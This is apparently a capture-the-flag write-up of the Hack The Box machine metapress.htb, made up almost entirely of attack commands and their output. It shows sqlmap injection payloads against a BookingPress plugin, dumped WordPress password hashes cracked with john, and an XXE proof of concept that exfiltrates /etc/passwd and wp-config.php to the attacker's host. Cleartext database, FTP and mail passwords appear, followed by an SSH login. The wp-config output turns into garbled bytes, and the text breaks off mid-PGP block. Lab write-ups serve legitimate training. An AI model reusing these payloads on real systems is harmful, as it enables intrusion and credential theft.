
---
---
# Reconocimiento

```bash
nmap -sCV -p21,22,80 10.129.228.95                   
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-24 18:42 -0500
Stats: 0:04:16 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 87.50% done; ETC: 18:47 (0:00:06 remaining)
Nmap scan report for metapress.htb (10.129.228.95)
Host is up (0.56s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-generator: WordPress 5.6.2
|_http-trane-info: Problem with XML parsing of /evox/about
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
|_http-title: MetaPress &#8211; Official company site
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 304.20 seconds
```

## Website

![[Pasted image 20251224204351.png]]



```bash
wpscan --url http://metapress.htb --enumerate
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://metapress.htb/ [10.129.228.95]
[+] Started: Wed Dec 24 18:46:01 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://metapress.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.7
 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:02:05 <============================================================================================================> (652 / 652) 100.00% Time: 00:02:05
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:08:32 <==========================================================================================================> (2575 / 2575) 100.00% Time: 00:08:32

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:29 <=============================================================================================================> (137 / 137) 100.00% Time: 00:00:29

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:14 <===================================================================================================================> (75 / 75) 100.00% Time: 00:00:14

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:20 <========================================================================================================> (100 / 100) 100.00% Time: 00:00:20

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 <==============================================================================================================> (10 / 10) 100.00% Time: 00:00:03

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://metapress.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] manager
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Dec 24 18:58:26 2025
[+] Requests Done: 3595
[+] Cached Requests: 9
[+] Data Sent: 1.105 MB
[+] Data Received: 1.173 MB
[+] Memory used: 300.586 MB
[+] Elapsed time: 00:12:24
```

https://patchstack.com/database/wordpress/plugin/bookingpress-appointment-booking/vulnerability/wordpress-bookingpress-plugin-1-0-10-unauthenticated-sql-injection-sqli-vulnerability

![[Pasted image 20251224221030.png]]

```bash
sqlmap -r req --batch -p total_service                   
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.12#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:14:50 /2025-12-24/

[20:14:50] [INFO] parsing HTTP request from 'req'
[20:14:50] [INFO] testing connection to the target URL
[20:14:52] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:14:52] [INFO] testing if the target URL content is stable
[20:14:54] [INFO] target URL content is stable
[20:14:54] [WARNING] heuristic (basic) test shows that POST parameter 'total_service' might not be injectable
[20:14:55] [INFO] testing for SQL injection on POST parameter 'total_service'
[20:14:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:15:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:15:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:15:06] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[20:15:10] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:15:13] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:15:17] [INFO] testing 'Generic inline queries'
[20:15:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[20:15:18] [WARNING] time-based comparison requires larger statistical model, please wait. (done)                                                                                          
[20:15:22] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:15:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:15:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:15:43] [INFO] POST parameter 'total_service' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:15:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:15:43] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:16:07] [INFO] target URL appears to be UNION injectable with 9 columns
[20:16:09] [INFO] POST parameter 'total_service' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
---
Parameter: total_service (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=876c64aa89&category_id=33&total_service=1) AND (SELECT 7882 FROM (SELECT(SLEEP(5)))TByO) AND (4381=4381

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=876c64aa89&category_id=33&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176627871,0x64424d654c657772426f5a5742645162714963596441644f4b45486c674c6c7a506e705a6b4f4370,0x717a7a7071)-- -
---
[20:16:09] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0, PHP 8.0.24
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:16:10] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/metapress.htb'

[*] ending @ 20:16:10 /2025-12-24/

                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/meta]
└─# sqlmap -r req --batch -p total_service --dbs
        ___
       __H__                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.9.12#stable}                                                                                                                                                   
|_ -| . [,]     | .'| . |                                                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:16:27 /2025-12-24/

[20:16:27] [INFO] parsing HTTP request from 'req'
[20:16:27] [INFO] resuming back-end DBMS 'mysql' 
[20:16:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: total_service (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=876c64aa89&category_id=33&total_service=1) AND (SELECT 7882 FROM (SELECT(SLEEP(5)))TByO) AND (4381=4381

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=876c64aa89&category_id=33&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176627871,0x64424d654c657772426f5a5742645162714963596441644f4b45486c674c6c7a506e705a6b4f4370,0x717a7a7071)-- -
---
[20:16:29] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0, PHP 8.0.24
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:16:29] [INFO] fetching database names
available databases [2]:
[*] blog
[*] information_schema

[20:16:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/metapress.htb'

[*] ending @ 20:16:30 /2025-12-24/

                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/meta]
└─# sqlmap -r req --batch -p total_service -D blog --tables
        ___
       __H__                                                                                                                                                                                
 ___ ___[(]_____ ___ ___  {1.9.12#stable}                                                                                                                                                   
|_ -| . [)]     | .'| . |                                                                                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:16:38 /2025-12-24/

[20:16:38] [INFO] parsing HTTP request from 'req'
[20:16:38] [INFO] resuming back-end DBMS 'mysql' 
[20:16:38] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: total_service (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=876c64aa89&category_id=33&total_service=1) AND (SELECT 7882 FROM (SELECT(SLEEP(5)))TByO) AND (4381=4381

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=876c64aa89&category_id=33&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176627871,0x64424d654c657772426f5a5742645162714963596441644f4b45486c674c6c7a506e705a6b4f4370,0x717a7a7071)-- -
---
[20:16:39] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.0.24, Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:16:39] [INFO] fetching tables for database: 'blog'
Database: blog
[27 tables]
+--------------------------------------+
| wp_bookingpress_appointment_bookings |
| wp_bookingpress_categories           |
| wp_bookingpress_customers            |
| wp_bookingpress_customers_meta       |
| wp_bookingpress_customize_settings   |
| wp_bookingpress_debug_payment_log    |
| wp_bookingpress_default_daysoff      |
| wp_bookingpress_default_workhours    |
| wp_bookingpress_entries              |
| wp_bookingpress_form_fields          |
| wp_bookingpress_notifications        |
| wp_bookingpress_payment_logs         |
| wp_bookingpress_services             |
| wp_bookingpress_servicesmeta         |
| wp_bookingpress_settings             |
| wp_commentmeta                       |
| wp_comments                          |
| wp_links                             |
| wp_options                           |
| wp_postmeta                          |
| wp_posts                             |
| wp_term_relationships                |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
| wp_users                             |
+--------------------------------------+

[20:16:40] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/metapress.htb'

[*] ending @ 20:16:40 /2025-12-24/

                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/meta]
└─# sqlmap -r req --batch -p total_service -D blog -T wp_users --dump
        ___
       __H__                                                                                                                                                                                
 ___ ___[)]_____ ___ ___  {1.9.12#stable}                                                                                                                                                   
|_ -| . [(]     | .'| . |                                                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:16:53 /2025-12-24/

[20:16:53] [INFO] parsing HTTP request from 'req'
[20:16:53] [INFO] resuming back-end DBMS 'mysql' 
[20:16:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: total_service (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=876c64aa89&category_id=33&total_service=1) AND (SELECT 7882 FROM (SELECT(SLEEP(5)))TByO) AND (4381=4381

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=876c64aa89&category_id=33&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176627871,0x64424d654c657772426f5a5742645162714963596441644f4b45486c674c6c7a506e705a6b4f4370,0x717a7a7071)-- -
---
[20:16:55] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.0.24, Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:16:55] [INFO] fetching columns for table 'wp_users' in database 'blog'
[20:16:56] [INFO] fetching entries for table 'wp_users' in database 'blog'
[20:16:56] [INFO] recognized possible password hashes in column 'user_pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[20:16:57] [INFO] using hash method 'phpass_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/smalldict.txt' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[20:16:57] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[20:16:57] [INFO] starting dictionary-based cracking (phpass_passwd)
[20:16:57] [INFO] starting 16 processes 
[20:17:05] [WARNING] no clear password(s) found                                                                                                                                            
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

[20:17:05] [INFO] table 'blog.wp_users' dumped to CSV file '/root/.local/share/sqlmap/output/metapress.htb/dump/blog/wp_users.csv'
[20:17:05] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/metapress.htb'

```


```bash
john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (?)
```


![[Pasted image 20251225003440.png]]

https://github.com/Val-Resh/CVE-2021-29447-POC

```bash
python3 CVE-2021-29447.py --url http://metapress.htb --server-ip 10.10.17.19 -u manager -p partylikearockstar
[*] Attempting to authenticate to http://metapress.htb/wp-login.php with manager:partylikearockstar
[*] Authenticated successfully.
[*] Generated a WAV payload with XXE.
[*] Retrieving upload nonce.
[*] Nonce retrieved successfully: a7b10cb15d
[*] Server listening on 10.10.17.19:45454

File to Exfiltrate: /etc/passwd
[*] Created DTD file.
[*] Uploading the WAV payload.
10.129.236.50 - - [24/Dec/2025 22:52:59] "GET /xxe.dtd HTTP/1.1" 200 -
10.129.236.50 - - [24/Dec/2025 22:53:02] "GET /xxe.dtd HTTP/1.1" 200 -
[*] WAV payload uploaded successfully.

[*] File extracted successfully:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin


File to Exfiltrate: /home/jnelson/.ssh/id_rsa
[*] Created DTD file.
[*] Uploading the WAV payload.
10.129.236.50 - - [24/Dec/2025 22:53:32] "GET /xxe.dtd HTTP/1.1" 200 -
10.129.236.50 - - [24/Dec/2025 22:53:34] "GET /xxe.dtd HTTP/1.1" 200 -
[*] WAV payload uploaded successfully.

[*] File not found or lack file permissions.

File to Exfiltrate: ../wp-config.php
[*] Created DTD file.
[*] Uploading the WAV payload.
10.129.236.50 - - [24/Dec/2025 22:53:52] "GET /xxe.dtd HTTP/1.1" 200 -
10.129.236.50 - - [24/Dec/2025 22:53:56] "GET /xxe.dtd HTTP/1.1" 200 -
[*] WAV payload uploaded successfully.

[*] File extracted successfully:

<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n
ÌÛOËÎÈ
NÃBY[J  ÔÑPÕTWÐUUÒÑVIË  Þ       ▒I
ØUXKÒIJPM×L▒ÛÑUÎLQVZ\ÛIRTMÏWXIIÈ
Ë▒]QQZIMÓÑÑÑQÒSÒRWZZ]ÉÒ_JÑÞÜRÖIÈ
NÃBY[J  ÓÓÑWÒÑVIÔÛYQ    Ì▒N×WJÓH\ØQYQ

SÍÓÍIÈ^YÎN
YÒBY[J  ÐUUÔÐS  ÖÎÕØËËHÊY
ÍL▒YÖUÞX
        ]
\ßY     NË
          #ã2Br°Ð¦FVfæRu4T5U$UôUDõ4ÅBrÂsæd3bsSVD§3òDóG¦Öå¶Ö¥uçT§&µóÖD6¥$öEuµ2gæöÖæ¥d3ó"Ôôâr°Ð¦FVfæRtÄôttTEôåõ4ÅBrÂsE¶e5ã2ÒSô÷×¶u&÷Ö¦ÅæÔ×wÕGäãÒeä§4Òd¥D¤Udâ4äöDcÒr°Ð¦FVfæRtäôä4Uõ4ÅBrÂrç5Rd5&Æó³V6Å´gvU4çCefR7×r'ÆÕc¤µ6µDw7bUCScÃÖ$Âr°Ð Ð¢ò¢ Ð¢¢v÷&E&W72FF&6RF&ÆR&VfàÐ¢¢ðÐ¢GF&ÆU÷&VfÒwwòs°Ð Ð¢ò¢ Ð¢¢f÷"FWfVÆ÷W'3¢v÷&E&W72FV'VvværÖöFRàÐ¢¢Ææ²GG3¢ò÷v÷&G&W72æ÷&r÷7W÷'Bö'F6ÆRöFV'VvværÖâ×v÷&G&W72ðÐ¢¢ðÐ¦FVfæRuuôDT%TrrÂfÇ6R°Ð Ð¢ò¢¢'6öÇWFRFFòFRv÷&E&W72F&V7F÷'â¢ðÐ¦bFVfæVBt%5Dr°Ð FVfæRt%5DrÂõôD%õòâròr°Ð§ÐÐ Ð¢ò¢¢6WG2Wv÷&E&W72f'2æBæ6ÇVFVBfÆW2â¢ðÐ§&WV&Uööæ6R%5Dâww×6WGFæw2çs°Ð 
```

```bash
nxc ssh 10.129.236.50 -u jnelson -p creds 
SSH         10.129.236.50   22     10.129.236.50    [*] SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
SSH         10.129.236.50   22     10.129.236.50    [-] jnelson:635Aq@TdqrCwXFUZ
SSH         10.129.236.50   22     10.129.236.50    [-] jnelson:9NYS_ii@FyL_p5M2NvJ
SSH         10.129.236.50   22     10.129.236.50    [-] jnelson:partylikearockstar
```

```bash
ftp metapress.htb@10.129.236.50
Connected to 10.129.236.50.
220 ProFTPD Server (Debian) [::ffff:10.129.236.50]
331 Password required for metapress.htb
Password: 
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
```

```php
cat send_email.php  
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
```

```bash
ssh jnelson@metapress.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jnelson@metapress.htb's password: 
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 25 12:51:26 2022 from 10.10.14.23
jnelson@meta2:~$ cat user.txt 
0833015f1af165c9f56e839828905b31
```

```bash
jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25  2022 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 ssh
```

```bash
jnelson@meta2:~/.passpie/ssh$ ls
jnelson.pass  root.pass
jnelson@meta2:~/.passpie/ssh$ cat root.pass 
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----


  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

  lpF0RatbxQGWBks5F3o=

  =uh1B

